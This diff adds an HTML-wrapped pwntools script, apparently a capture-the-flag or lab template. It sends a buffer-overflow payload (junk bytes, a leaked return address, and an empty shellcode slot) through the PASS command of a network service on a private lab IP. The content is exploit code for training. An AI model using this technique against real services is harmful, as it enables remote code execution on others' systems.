@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>buffer_overflow_socket_template.py</title>
+</head><body>#using pwn tools<br/>
+from pwn import *<br/>
+<br/>
+# Set Basic Junk<br/>
+context(os="linux", arch="i386")<br/>
+HOST, PORT = "192.168.101.142", "7411"<br/>
+<br/>
+# Junk to get to EIP Overwrite<br/>
+junk = "\xCC"*28&#09;&#09;&#09;#\xCC tells gdb to immediately break if it ever starts to exec<ul><li style="list-style-type: none">&nbsp;&#09;&#09;&#09;&#09;&#09;#alows for much easier debugging and control flow</li>
+</ul>
+<br/>
+# Memory Address Leaked<br/>
+mem = p32(0xffebb890+32)&#09;&#09;#don't need to flip for little endian because p32()<ul><li style="list-style-type: none">#adding 32 because len(junk)=28,+4, in order to get to our Buff. Or pick a different/closer address, or NOP sled, etc, etc. This address was given to us via the prog automatically)</li>
+</ul>
+<br/>
+# Shellcode to execute<br/>
+<br/>
+# Place socket reuse shellcode here<br/>
+<br/>
+# Place custom shellcode here (recommended to use socket reuse shellcode though<br/>
+buf = ""<br/>
+<br/>
+# Connect to Host<br/>
+p = remote(HOST, PORT)<br/>
+<br/>
+p.recvuntil("OK Ready. Send USER command.")<br/>
+p.sendline("DEBUG")<br/>
+p.recvuntil("OK DEBUG mode on.")<br/>
+p.sendline("USER admin")<br/>
+p.recvuntil("OK Send PASS command.")<br/>
+p.sendline("PASS " + junk + mem + buf)<br/>
+p.interactive() &#09;&#09;#only needed if shellcode is socket reuse</body></html>
